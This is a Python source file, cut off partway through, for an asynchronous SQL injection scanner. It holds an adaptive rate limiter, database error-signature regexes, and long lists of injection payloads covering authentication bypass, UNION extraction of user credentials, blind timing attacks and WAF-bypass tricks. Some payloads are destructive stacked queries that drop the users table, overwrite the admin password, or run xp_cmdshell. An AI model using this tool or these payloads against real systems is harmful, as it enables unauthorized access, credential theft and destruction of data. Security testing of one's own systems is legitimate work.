import asyncio
import uuid
import aiohttp
import logging
import time
import socket
import re
import os
import hashlib
import json
import tempfile
from typing import List, Dict, Any, Optional, Set, Tuple
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from datetime import datetime
import random
from bs4 import BeautifulSoup
from collections import defaultdict
import traceback

# Import shared crawler utility
from ..utils.crawler import IntelligentCrawler, generate_url_fingerprint

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def extract(url):
    """
    Extract domain from URL.
    
    Args:
        url: URL to extract domain from
        
    Returns:
        str: Extracted domain
    """
    parsed_url = urlparse(url)
    domain = parsed_url.netloc
    return domain

class RateLimiter:
    """Rate limiter with dynamic adjustment based on server performance."""
    
    def __init__(self, rate_limit: float = 2.0, burst_limit: int = 5):
        """
        Initialize the rate limiter.
        
        Args:
            rate_limit: Maximum requests per second
            burst_limit: Maximum burst size
        """
        self.rate_limit = rate_limit
        self.burst_limit = burst_limit
        self.last_request_time = defaultdict(float)
        self.token_bucket = defaultdict(lambda: burst_limit)
        self.domain_failures = defaultdict(int)
        self.domain_successes = defaultdict(int)
        self.domain_limits = defaultdict(lambda: rate_limit)
        
        # Performance tracking for dynamic adjustments
        self.response_times = defaultdict(lambda: [])
        self.domain_error_types = defaultdict(lambda: defaultdict(int))
        self.consecutive_errors = defaultdict(int)
        self.consecutive_successes = defaultdict(int)
        self.performance_data = defaultdict(lambda: {"avg_response_time": 0.0, "error_rate": 0.0})
        
        # Maximum rate limit (safety cap)
        self.max_rate_limit = rate_limit * 5.0
        
        # Minimum rate limit (fallback safety)
        self.min_rate_limit = 0.1  # Never go below 0.1 req/sec
        
        self.lock = asyncio.Lock()
    
    async def acquire(self, domain: Optional[str] = None) -> bool:
        """
        Try to acquire a token for rate limiting.
        
        Args:
            domain: Optional domain to apply rate limiting for
            
        Returns:
            bool: True if token was acquired, False otherwise
        """
        async with self.lock:
            current_time = time.time()
            domain = domain or "default"
            
            # Calculate time since last request
            time_since_last = current_time - self.last_request_time[domain]
            
            # Add tokens based on time elapsed (up to burst limit)
            new_tokens = time_since_last * self.domain_limits[domain]
            self.token_bucket[domain] = min(self.token_bucket[domain] + new_tokens, self.burst_limit)
            
            # Check if there's at least one token
            if self.token_bucket[domain] >= 1:
                self.token_bucket[domain] -= 1
                self.last_request_time[domain] = current_time
                return True
            else:
                logger.debug(f"Rate limiting applied for domain: {domain}")
                return False
    
    async def wait_for_token(self, domain: Optional[str] = None):
        """
        Wait until a token becomes available.
        
        Args:
            domain: Optional domain to apply rate limiting for
        """
        domain = domain or "default"
        
        # Adaptive delay based on domain failures and error types
        if self.consecutive_errors[domain] > 0:
            # Exponential backoff based on consecutive failures with jitter
            backoff_factor = min(30, 2 ** (self.consecutive_errors[domain] - 1))
            backoff_time = backoff_factor * random.uniform(0.75, 1.25)
            
            # Add additional backoff for critical errors vs. transient errors
            critical_errors = self.domain_error_types[domain].get("critical", 0)
            if critical_errors > 0:
                backoff_time *= (1 + 0.5 * min(5, critical_errors))  # Up to 3.5x longer backoff for critical errors
                
            logger.debug(f"Backing off for {backoff_time:.2f} seconds due to {self.consecutive_errors[domain]} consecutive errors")
            await asyncio.sleep(backoff_time)
        
        # Try to acquire a token
        while not await self.acquire(domain):
            # Calculate time to wait with randomized jitter based on domain performance
            wait_time = (1.0 / self.domain_limits[domain]) * random.uniform(1.0, 1.2)
            
            # Add extra wait for domains with consistently slow responses
            avg_response_time = self.performance_data[domain]["avg_response_time"]
            if avg_response_time > 2.0:  # If average response time is greater than 2 seconds
                wait_time *= min(3.0, (avg_response_time / 2.0))  # Scale wait time by response time, up to 3x
                
            await asyncio.sleep(wait_time)
    
    def report_response_time(self, domain: Optional[str] = None, response_time: float = 0.0):
        """
        Report response time to adjust rate limits based on server performance.
        
        Args:
            domain: Domain to report for
            response_time: Response time in seconds
        """
        domain = domain or "default"
        
        # Update response time tracking (keep last 10 responses)
        self.response_times[domain].append(response_time)
        if len(self.response_times[domain]) > 10:
            self.response_times[domain].pop(0)
            
        # Calculate average response time
        if self.response_times[domain]:
            avg_time = sum(self.response_times[domain]) / len(self.response_times[domain])
            self.performance_data[domain]["avg_response_time"] = avg_time
            
            # Dynamically adjust rate limit based on response time
            # Faster responses -> higher rate limit, slower responses -> lower rate limit
            if avg_time < 0.5 and self.consecutive_successes[domain] >= 5:
                # Server responds quickly, increase rate limit
                new_rate = min(self.max_rate_limit, self.domain_limits[domain] * 1.2)
                if new_rate > self.domain_limits[domain]:
                    logger.debug(f"Increasing rate limit for {domain} to {new_rate:.2f} req/s (fast responses)")
                    self.domain_limits[domain] = new_rate
            elif avg_time > 2.0:
                # Server responds slowly, decrease rate limit
                new_rate = max(self.min_rate_limit, self.domain_limits[domain] * 0.8)
                if new_rate < self.domain_limits[domain]:
                    logger.debug(f"Decreasing rate limit for {domain} to {new_rate:.2f} req/s (slow responses)")
                    self.domain_limits[domain] = new_rate
    
    def report_error(self, domain: Optional[str] = None, error_type: str = "transient"):
        """
        Report an error to adjust rate limits and backoff strategy.
        
        Args:
            domain: Domain to report error for
            error_type: Type of error (transient or critical)
        """
        domain = domain or "default"
        
        # Track consecutive errors and reset consecutive successes
        self.consecutive_errors[domain] += 1
        self.consecutive_successes[domain] = 0
        
        # Track error type
        self.domain_error_types[domain][error_type] += 1
        
        # Update error rate in performance data
        total_requests = self.domain_failures[domain] + self.domain_successes[domain]
        if total_requests > 0:
            error_rate = self.domain_failures[domain] / total_requests
            self.performance_data[domain]["error_rate"] = error_rate
            
        # Adjust rate limit based on error type and count
        if error_type == "critical" or self.consecutive_errors[domain] >= 3:
            # Significant reduction for critical errors or multiple consecutive errors
            reduction_factor = 0.5 if error_type == "critical" else 0.7
            new_rate = max(self.min_rate_limit, self.domain_limits[domain] * reduction_factor)
            logger.debug(f"Reducing rate limit for {domain} to {new_rate:.2f} req/s due to {error_type} errors")
            self.domain_limits[domain] = new_rate
            
        # Standard failure tracking
        self.domain_failures[domain] += 1
    
    def report_success(self, domain: Optional[str] = None, response_time: float = 0.0):
        """
        Report a successful request to adjust rate limits.
        
        Args:
            domain: Domain to report success for
            response_time: Response time of the successful request
        """
        domain = domain or "default"
        
        # Track consecutive successes and reset consecutive errors
        self.consecutive_successes[domain] += 1
        self.consecutive_errors[domain] = 0
        
        # Track successful request
        self.domain_successes[domain] += 1
        
        # Update response time tracking
        if response_time > 0:
            self.report_response_time(domain, response_time)
        
        # Update error rate in performance data
        total_requests = self.domain_failures[domain] + self.domain_successes[domain]
        if total_requests > 0:
            error_rate = self.domain_failures[domain] / total_requests
            self.performance_data[domain]["error_rate"] = error_rate
        
        # Gradually restore rate limit after consecutive successful requests
        if self.domain_limits[domain] < self.rate_limit and self.consecutive_successes[domain] >= 5:
            increase_factor = min(1.2, 1.0 + (self.consecutive_successes[domain] * 0.02))  # Up to 20% increase
            new_rate = min(self.rate_limit, self.domain_limits[domain] * increase_factor)
            if new_rate > self.domain_limits[domain]:
                logger.debug(f"Increasing rate limit for {domain} to {new_rate:.2f} req/s after {self.consecutive_successes[domain]} consecutive successes")
                self.domain_limits[domain] = new_rate
    
    def get_performance_data(self, domain: Optional[str] = None) -> Dict[str, float]:
        """
        Get performance data for a domain.
        
        Args:
            domain: Domain to get data for
            
        Returns:
            Dict with performance metrics
        """
        domain = domain or "default"
        return dict(self.performance_data[domain])

class EnhancedSQLScanner:
    """
    Enhanced scanner for detecting SQL injection vulnerabilities.
    Improved with:
    - Support for modern frameworks (React, Angular, Vue.js)
    - Dynamic rate limiting and concurrency adjustment based on server performance
    - Advanced error classification and handling for network issues
    - Enhanced payload sets for different database engines and WAF bypass techniques
    - Feedback loop to optimize scanning parameters in real-time
    - Priority-based URL scanning to find vulnerabilities faster
    """
    
    # SQL error patterns to look for in responses
    sql_error_patterns = [
        # MySQL
        r"sql syntax.*mysql",
        r"warning.*mysql",
        r"mysql.*error",
        r"mysql.*driver",
        r"mysqli.*error",
        r"mysqli.*sql",
        r"mysql.*syntax",
        r"mysql.*working",
        r"Warning.*?\Wmysqli?_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that (corresponds to|fits) your MySQL server version",
        r"Unknown column '[^ ]+' in 'field list'",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"Zend_Db_(Adapter|Statement)_Mysqli_Exception",
        r"Pdo[./_\\]Mysql",
        r"MySqlException",
        r"SQLSTATE\[\d+\]: Syntax error or access violation",
        
        # MariaDB
        r"check the manual that (corresponds to|fits) your MariaDB server version",
        
        # PostgreSQL
        r"postgresql.*error",
        r"postgres.*error",
        r"pg_.*error",
        r"pg.*exception",
        r"postgresql.*syntax",
        r"PostgreSQL.*?ERROR",
        r"Warning.*?\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s\ssyntax error at or near",
        r"ERROR: parser: parse error at or near",
        r"PostgreSQL query failed",
        r"org\.postgresql\.jdbc",
        r"Pdo[./_\\]Pgsql",
        r"PSQLException",
        
        # Microsoft SQL Server
        r"microsoft.*database",
        r"microsoft.*driver",
        r"microsoft.*server",
        r"microsoft.* sql",
        r"odbc.*driver",
        r"odbc.*sql",
        r"sql server.*error",
        r"unclosed.*quotation",
        r"mssql.*error",
        r"ms sql.*error",
        r"ms sql server",
        r"Driver.*? SQL[\-\_\ ]*Server",
        r"OLE DB.*? SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*?\W(mssql|sqlsrv)_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.SqlException",
        r"(?s)Exception.*?\bRoadhouse\.Cms\.",
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        r"\[SQL Server\]",
        r"ODBC SQL Server Driver",
        r"ODBC Driver \d+ for SQL Server",
        r"SQLServer JDBC Driver",
        r"com\.jnetdirect\.jsql",
        r"macromedia\.jdbc\.sqlserver",
        r"Zend_Db_(Adapter|Statement)_Sqlsrv_Exception",
        r"com\.microsoft\.sqlserver\.jdbc",
        r"Pdo[./_\\](Mssql|SqlSrv)",
        r"SQL(Srv|Server)Exception",
        
        # Microsoft Access
        r"Microsoft Access (\d+ )?Driver",
        r"JET Database Engine",
        r"Access Database Engine",
        r"ODBC Microsoft Access",
        r"Syntax error \(missing operator\) in query expression",
        
        # Oracle
        r"oracle.*error",
        r"oracle.*driver",
        r"ora-[0-9]",
        r"oracle.*database",
        r"\bORA-\d{5}",
        r"Oracle error",
        r"Oracle.*?Driver",
        r"Warning.*?\W(oci|ora)_",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"macromedia\.jdbc\.oracle",
        r"oracle\.jdbc",
        r"Zend_Db_(Adapter|Statement)_Oracle_Exception",
        r"Pdo[./_\\](Oracle|OCI)",
        r"OracleException",
        
        # IBM DB2
        r"CLI Driver.*?DB2",
        r"DB2 SQL error",
        r"\bdb2_\w+\(",
        r"SQLCODE[=:\d, -]+SQLSTATE",
        r"com\.ibm\.db2\.jcc",
        r"Zend_Db_(Adapter|Statement)_Db2_Exception",
        r"Pdo[./_\\]Ibm",
        r"DB2Exception",
        r"ibm_db_dbi\.ProgrammingError",
        
        # SQLite
        r"sqlite.*error",
        r"sqlite.*syntax",
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
        r"Warning.*?\W(sqlite_|SQLite3::)",
        r"\[SQLITE_ERROR\]",
        r"Error: SQLITE_ERROR:",
        r"SQLite error \d+:",
        r"sqlite3.OperationalError:",
        r"SQLite3::SQLException",
        r"org\.sqlite\.JDBC",
        r"Pdo[./_\\]Sqlite",
        r"SQLiteException",
        
        # Sybase
        r"Warning.*?\Wsybase_",
        r"Sybase message",
        r"Sybase.*?Server message",
        r"SybSQLException",
        r"Sybase\.Data\.AseClient",
        r"com\.sybase\.jdbc",
        
        # Ingres
        r"Warning.*?\Wingres_",
        r"Ingres SQLSTATE",
        r"Ingres\W.*?Driver",
        r"com\.ingres\.gcf\.jdbc",
        
        # FrontBase
        r"Exception (condition )?\d+\. Transaction rollback",
        r"com\.frontbase\.jdbc",
        r"Syntax error 1. Missing",
        r"(Semantic|Syntax) error [1-4]\d{2}\.",
        
        # HSQLDB
        r"Unexpected end of command in statement \[",
        r"Unexpected token.*?in statement \[",
        r"org\.hsqldb\.jdbc",
        
        # H2
        r"org\.h2\.jdbc",
        r"\[42000-192\]",
        
        # MonetDB
        r"![0-9]{5}![^\n]+(failed|unexpected|error|syntax|expected|violation|exception)",
        r"\[MonetDB\]\[ODBC Driver",
        r"nl\.cwi\.monetdb\.jdbc",
        
        # Apache Derby
        r"Syntax error: Encountered",
        r"org\.apache\.derby",
        r"ERROR 42X01",
        
        # Vertica
        r", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):",
        r"/vertica/Parser/scan",
        r"com\.vertica\.jdbc",
        r"org\.jkiss\.dbeaver\.ext\.vertica",
        r"com\.vertica\.dsi\.dataengine",
        
        # Mckoi
        r"com\.mckoi\.JDBCDriver",
        r"com\.mckoi\.database\.jdbc",
        r"&lt;REGEX_LITERAL&gt;",
        
        # Presto
        r"com\.facebook\.presto\.jdbc",
        r"io\.prestosql\.jdbc",
        r"com\.simba\.presto\.jdbc",
        r"UNION query has different number of fields: \d+, \d+",
        
        # Altibase
        r"Altibase\.jdbc\.driver",
        
        # MimerSQL
        r"com\.mimer\.jdbc",
        r"Syntax error,[^\n]+assumed to mean",
        
        # CrateDB
        r"io\.crate\.client\.jdbc",
        
        # Cache
        r"encountered after end of query",
        r"A comparison operator is required here",
        
        # Generic SQL errors
        r"sql syntax.*error",
        r"sql error.*syntax",
        r"syntax error.*sql",
        r"sql statement",
        r"sql syntax",
        r"unexpected.*sql",
        r"syntaxerror.*sql query",
        r"sqlexception",
        r"sqlstate",
        r"sql command.*not properly ended",
        r"sql server.*error",
        r"line [0-9]*.*sql",
        r"error.*syntax",
        r"unclosed.*mark",
        r"at line [0-9]*",
        
        # XPath Injection
        r"XPathException",
        r"Warning: SimpleXMLElement::xpath()",
        r"Error parsing XPath",
        
        # Common .NET/Spring errors
        r"Unclosed quotation mark after the character string",
        r"StatementCallback; bad SQL grammar"
    ]

    def __init__(self, max_concurrent_requests=10, max_crawl_depth=3, scan_timeout=60):
        """
        Initialize the enhanced SQL scanner.
        
        Args:
            max_concurrent_requests: Maximum number of concurrent requests
            max_crawl_depth: Maximum depth to crawl
            scan_timeout: Maximum scan time in minutes
        """
        # Default settings
        self.max_concurrent_requests = max_concurrent_requests
        self.max_crawl_depth = max_crawl_depth
        self.scan_timeout = scan_timeout * 60  # Convert to seconds
        
        # Performance tracking
        self.scan_progress = 0
        self.scan_start_time = 0
        self.chunk_size = 20  # Initial chunk size
        self.concurrency_adjustment_interval = 10  # Check every 10 seconds
        self.concurrency_lock = asyncio.Lock()
        
        # State tracking for deduplication and optimization
        self.blind_test_cache = {}
        self.tested_error_params = set()  # Track tested parameters for error-based SQLi
        self.tested_blind_params = set()  # Track tested parameters for blind SQLi
        self.url_fingerprints = set()  # For deduplication
        
        # Domain throttling for tracking requests per domain
        self.domain_throttling = defaultdict(int)
        
        # Rate limiting and adaptive scanning
        self.rate_limiter = RateLimiter(
            rate_limit=5.0,  # Initial rate limit (requests per second)
            burst_limit=10    # Initial burst limit
        )
        
        # Default headers
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # Performance metrics
        self.performance_stats = {
            "requests_total": 0,
            "requests_successful": 0,
            "requests_failed": 0,
            "avg_response_time": 0.0,
            "error_rate": 0.0,
            "start_time": time.time(),
            "last_adjustment_time": time.time(),
            "current_concurrency": max_concurrent_requests,
            "min_concurrency": max(2, max_concurrent_requests // 5),
            "max_concurrency": max_concurrent_requests * 2,
        }
        
        # Success tracking for adapting payload selection
        self.success_count = 0
        self.error_count = 0
        self.avg_response_time = 0.0
        
        # Payload effectiveness tracking (to prioritize successful payloads)
        self.payload_effectiveness = defaultdict(lambda: {"attempted": 0, "successful": 0})
        
        # Initialize different categories of SQL injection payloads
        self._initialize_advanced_payloads()
        
        # Configure adaptive scanning parameters
        self.adaptive_config = {
            "min_delay_between_requests": 0.1,  # seconds
            "max_delay_between_requests": 2.0,  # seconds
            "error_threshold": 0.3,  # 30% error rate triggers slowdown
            "success_threshold": 0.9,  # 90% success rate triggers speedup
            "response_time_threshold": 3.0,  # seconds, threshold for slow responses
            "adaptive_payload_selection": True,  # Enable adaptive payload selection
            "max_retries_per_request": 3,  # Maximum number of retries on failure
            "fail_fast": True,  # Skip further tests if initial tests fail
            "detect_waf": True,  # Detect and adapt to WAF presence
            "follow_redirects": True,  # Follow redirects during testing
        }
        
        # Analytics for vulnerability patterns (used to detect vulnerability likelihood)
        self.vulnerability_analytics = {
            "vulnerable_params": set(),  # Set of param names found vulnerable
            "vulnerable_patterns": defaultdict(int),  # Count of pattern types found vulnerable
            "suspected_dbms_types": defaultdict(int),  # Count of detected DBMS types
            "waf_detected": False,  # Whether a WAF has been detected
            "waf_bypassed": False,  # Whether we've managed to bypass a WAF
        }
        
        # Set up logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger("EnhancedSQLScanner")
    
    def _initialize_advanced_payloads(self):
        """Initialize different categories of SQL injection payloads"""
        # Additional error patterns
        self.additional_sql_error_patterns = [
            "sql syntax",
            "syntax error",
            "mysql error",
            "oracle error",
            "sql server error",
            "odbc error",
            "database error",
            "db error",
            "syntax error near",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "postgresql error",
            "incorrect syntax near",
            "you have an error in your sql syntax",
            "ora-",
            "pg_query",
            "sqlstate"
        ]
        
        # Add these to our existing error patterns
        for pattern in self.additional_sql_error_patterns:
            if not any(pattern.lower() in existing.lower() for existing in self.sql_error_patterns):
                self.sql_error_patterns.append(pattern)
        
        # Standard error-based payloads
        self.error_payloads = [
            # Basic authentication bypass
            "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1 --", "\" OR 1=1 --",
            "' OR 1 --", "\" OR 1 --", "') OR ('1'='1", "\") OR (\"1\"=\"1",
            "' OR '1'='1' --", "\" OR \"1\"=\"1' --",
            "' OR 1=1 #", "\" OR 1=1 #", "' OR 1=1 /*", "\" OR 1=1 /*",
            "admin'--", "admin' #", "admin'/*", "admin' OR 1=1--", "admin\" OR 1=1--",
            "admin' OR '1'='1", "admin') OR ('1'='1", "1' OR '1' = '1", "1' OR '1' = '1' --",
            
            # UNION-based payloads
            "' UNION SELECT 1,2,3 --", "\" UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --", "\" UNION SELECT 1,2,3,4 --",
            "' UNION SELECT 1,2,3,4,5 --", "\" UNION SELECT 1,2,3,4,5 --",
            "' UNION SELECT NULL,NULL,NULL --", "\" UNION SELECT NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL --", "\" UNION SELECT NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL --", "\" UNION SELECT NULL,NULL,NULL,NULL,NULL --",
            "' UNION ALL SELECT 1,2,3 --", "\" UNION ALL SELECT 1,2,3 --",
            
            # Database fingerprinting
            "' UNION SELECT @@version,2,3 --", "\" UNION SELECT @@version,2,3 --",
            "' UNION SELECT version(),2,3 --", "\" UNION SELECT version(),2,3 --",
            "' AND SUBSTRING((SELECT @@version),1,1)='M' --",
            
            # Database content extraction
            "' UNION SELECT table_name,2,3 FROM information_schema.tables --",
            "' UNION SELECT column_name,2,3 FROM information_schema.columns --",
            "' UNION SELECT username,password,3 FROM users --",
            "' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns --",
            "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table' --",
            "' UNION SELECT NULL, NULL, concat(table_name) FROM information_schema.tables --",
            
            # Error-based payloads
            "' AND (SELECT 6765 FROM (SELECT(SLEEP(0.1)))OQT) AND 'nnoF'='nnoF",
            "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,0x27,BENCHMARK(25000000,MD5(1)),0x27,0x7e))s), 8, 8))) --",
            "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 --",
            "' AND (SELECT 2*(IF((SELECT * FROM users LIMIT 1)=1, BENCHMARK(10000000,MD5('A')), 8))) --",
            "' AND extractvalue(rand(),concat(0x7e,(SELECT version()),0x7e)) --",
            "' AND updatexml(rand(),concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1) --",
            
            # Stacked queries - multiple statements
            "'; DROP TABLE users; --", "'; SELECT * FROM users; --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
            "'; EXEC xp_cmdshell('cmd.exe /c echo vulnerable'); --",
            "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'; --",
            
            # SQLMap specific payloads
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) --",
            "' AND SLEEP(5) AND 'vRxe'='vRxe",
            "' AND 5174=(SELECT 5174 FROM PG_SLEEP(5)) --",
            "' WAITFOR DELAY '0:0:5' --",
            "')) OR SLEEP(5)='",
            "')) OR 5174=(SELECT 5174 FROM PG_SLEEP(5))='",
            "')) OR BENCHMARK(10000000,MD5(0x41))='",
            
            # Boolean-based blind payloads
            "' AND 1=1 --", "' AND 1=2 --",
            "' AND (SELECT 1) --", "' AND (SELECT 0) --",
            "\" AND (SELECT 1)=\"", "\" AND (SELECT 0)=\"",
            "' OR EXISTS(SELECT 1 FROM users) --", "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --",
            "' OR (SELECT 'x' FROM users WHERE username='admin' AND LENGTH(password)>5) --",
            "' OR (SELECT 'x' FROM users WHERE SUBSTR(username,1,1)='a') --",
            "' AND SUBSTR(version(),1,1)='5' --", "' OR ORD(SUBSTR(version(),1,1))>51 --",
            
            # URL-encoded payloads
            "%27%20OR%20%271%27%3D%271%27%20--",  # URL-encoded ' OR '1'='1' --
            "%27%20UNION%20SELECT%20NULL%2CNULL%2Cconcat%28username%2C%27%7C%27%2Cpassword%29%20FROM%20users%20--",
            
            # Different comment styles
            "' OR '1'='1' -- comment", "' OR '1'='1'#", "' OR '1'='1'/*", "' OR '1'='1';--",
            
            # Special character bypassing
            "' OR 1=1 %00", "' OR 1/**/=/**/1", "' OR/**/1=1", "' /*!50000OR*/ '1'='1'",
            "\"+OR+1=1--", "'+OR+'1'='1", "`OR 1=1 --", "') OR 1=1 --",
            
            # Output testing payloads
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
            "' UNION SELECT ALL 'SQLi' --",
            "' UNION SELECT 'SQLi',NULL --",
            "' UNION SELECT 'SQLi1','SQLi2' --",
            "' UNION SELECT 'SQLi',(SELECT version()) --",
            
            # Case sensitivity bypass
            "' OR 'a'='A' --", "' UnIoN SeLeCt 1,2,3 --",
            
            # Exotic payloads
            "' OR '1' || '1' = '11", "' OR 'sqlite' LIKE 'sql%", 
            "' OR username IS NOT NULL --", "\" OR \"x\"=\"x",
            "') OR ('x')=('x", "')) OR (('x'))=(('x", "\")) OR ((\"x\"))=((\"x",
            "')) OR 1=1--", ";SELECT * FROM users", 
            "/*!50000 OR 1=1*/",
            "' OR JSON_EXTRACT('[1]', '$[0]') = 1 --"
        ]
        
        # Blind SQL injection payloads (including both time-based and boolean-based)
        self.blind_payloads = [
            # MySQL sleep payloads 
            "' AND SLEEP(3) --", "\" AND SLEEP(3) --",
            "' OR SLEEP(3) --", "\" OR SLEEP(3) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
            "\" AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
            "1) AND SLEEP(3) --",
            "1)) AND SLEEP(3) --",
            "1' AND SLEEP(3) AND '1'='1",
            "' AND SLEEP(3) AND 'QTc'='QTc",
            "' AND SLEEP(3) OR 'a'='a",
            "\" AND SLEEP(3) OR \"a\"=\"a",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 10 AND SLEEP(3) --",
            
            # PostgreSQL sleep payloads
            "' AND pg_sleep(3) --", "\" AND pg_sleep(3) --",
            "' OR pg_sleep(3) --", "\" OR pg_sleep(3) --",
            "' AND 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "\" AND 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "' OR 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "\" OR 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "' AND (SELECT pg_sleep(3)) IS NOT NULL --",
            "' AND CASE WHEN (username='admin') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users --",
            
            # SQL Server payloads
            "' AND WAITFOR DELAY '0:0:3' --",
            "\" AND WAITFOR DELAY '0:0:3' --",
            "' OR WAITFOR DELAY '0:0:3' --",
            "\" OR WAITFOR DELAY '0:0:3' --",
            "1); WAITFOR DELAY '0:0:3' --",
            "1)); WAITFOR DELAY '0:0:3' --",
            "1'; WAITFOR DELAY '0:0:3' --",
            "' AND IF(version() LIKE '5%', WAITFOR DELAY '0:0:3', 'false') --",
            "'; WAITFOR DELAY '0:0:3' --",
            "'; BEGIN WAITFOR DELAY '0:0:3' END --",
            
            # Oracle payloads
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "\" AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "\" OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) ELSE NULL END FROM DUAL) IS NOT NULL --",
            
            # SQLite payloads
            "' AND RANDOMBLOB(500000000) AND '1'='1",
            "\" AND RANDOMBLOB(500000000) AND \"1\"=\"1",
            "' OR RANDOMBLOB(500000000) AND '1'='1",
            "\" OR RANDOMBLOB(500000000) AND \"1\"=\"1",
            "' AND IIF(2>1,RANDOMBLOB(500000000),1) --",
            
            # Generic heavy queries payloads
            "' AND (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "\" AND (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "' OR (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "\" OR (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "' AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) > 0 --",
            "' AND (WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 1000000) SELECT count(*) FROM t) > 0 --",
            
            # Boolean-based blind injection payloads (True condition)
            "' AND 1=1 --", "\" AND 1=1 --", "' OR 1=1 --", "\" OR 1=1 --",
            "' AND '1'='1", "\" AND \"1\"=\"1", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' AND 3>2 --", "\" AND 3>2 --", "' OR 3>2 --", "\" OR 3>2 --",
            
            # Boolean-based blind injection payloads (False condition)
            "' AND 1=2 --", "\" AND 1=2 --", "' OR 1=2 --", "\" OR 1=2 --",
            "' AND '1'='2", "\" AND \"1\"=\"2", "' OR '1'='2", "\" OR \"1\"=\"2",
            "' AND 3<2 --", "\" AND 3<2 --", "' OR 3<2 --", "\" OR 3<2 --"
        ]
        
        # Database-specific payloads - expanded with more targeted vectors
        # MySQL specific
        self.mysql_payloads = [
            "1' AND IF(1=1, SLEEP(3), 0)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(3)))A)--",
            "1' AND ELT(1=1,SLEEP(3))--",
            "1' UNION ALL SELECT SLEEP(3)--",
            "1' AND BENCHMARK(10000000,MD5(NOW()))--",
            "1' AND BENCHMARK(100000000,MD5('A'))--",
            "1' AND (SELECT 1 FROM dual WHERE database() LIKE '%')--",
            "1' OR EXPORT_SET(5,@:=0,(SELECT COUNT(*) FROM information_schema.tables WHERE @:=EXPORT_SET(5,EXPORT_SET(5,@,TABLE_NAME,0x7e,2),@,0x7e,2)),@,2)--",
            # Additional MySQL payloads
            "1' AND IF(SUBSTR(@@version,1,1)='5',SLEEP(3),0)--",
            "1' AND SLEEP(3) AND SUBSTRING(@@version,1,1)='5'--",
            "1' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
            "1' OR SLEEP(3) OR '1'='2",
            "1' AND CONVERT(varchar, 1)--",
            "1' OR 1=1 ORDER BY 1--",
            "1' OR 1=1 GROUP BY 1--",
            "1' OR 1=1 PROCEDURE ANALYSE()--",
            "1' OR 1=1 INTO OUTFILE 'result.txt'--",
            "1' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        # MSSQL specific
        self.mssql_payloads = [
            "1'; WAITFOR DELAY '0:0:3'--",
            "1' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers as sys2,sysusers as sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--",
